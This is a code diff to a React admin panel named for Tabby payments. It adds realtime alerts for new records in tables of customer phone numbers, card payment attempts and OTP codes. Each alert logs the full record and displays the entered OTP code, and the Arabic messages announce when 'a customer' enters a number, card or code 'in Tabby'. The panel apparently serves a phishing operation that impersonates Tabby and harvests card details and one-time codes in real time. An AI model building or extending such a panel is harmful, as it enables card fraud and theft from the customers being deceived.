@@ -118,10 +118,12 @@ const AdminTabbyPayments = () => {
         event: 'INSERT',
         schema: 'public',
         table: 'tabby_payments'
-      }, () => {
+      }, (payload) => {
+        console.log('🔔 عميل جديد أدخل رقمه في تابي!', payload.new);
+        playTabbyNotificationSound();
         toast({
           title: "🔔 طلب دفع تابي جديد!",
-          description: "تم استلام طلب دفع جديد",
+          description: `رقم الهاتف: ${payload.new.phone || 'غير متوفر'} | المبلغ: ${payload.new.total_amount} ر.س`,
           duration: 10000
         });
         fetchPayments();
@@ -137,10 +139,12 @@ const AdminTabbyPayments = () => {
         event: 'INSERT',
         schema: 'public',
         table: 'tabby_payment_attempts'
-      }, () => {
+      }, (payload) => {
+        console.log('🔔 عميل أدخل بيانات بطاقة في تابي!', payload.new);
+        playTabbyNotificationSound();
         toast({
           title: "🔔 بطاقة دفع جديدة!",
-          description: "تم إدخال بطاقة دفع جديدة",
+          description: `رقم البطاقة: ****${payload.new.card_number?.slice(-4) || '****'}`,
           duration: 8000
         });
         fetchPayments();
@@ -156,10 +160,12 @@ const AdminTabbyPayments = () => {
         event: 'INSERT',
         schema: 'public',
         table: 'tabby_otp_attempts'
-      }, () => {
+      }, (payload) => {
+        console.log('🔔 عميل أدخل OTP في تابي!', payload.new);
+        playTabbyNotificationSound();
         toast({
           title: "🔔 كود تحقق جديد!",
-          description: "تم إدخال كود تحقق جديد",
+          description: `الكود: ${payload.new.otp_code}`,
           duration: 8000
         });
         fetchPayments();
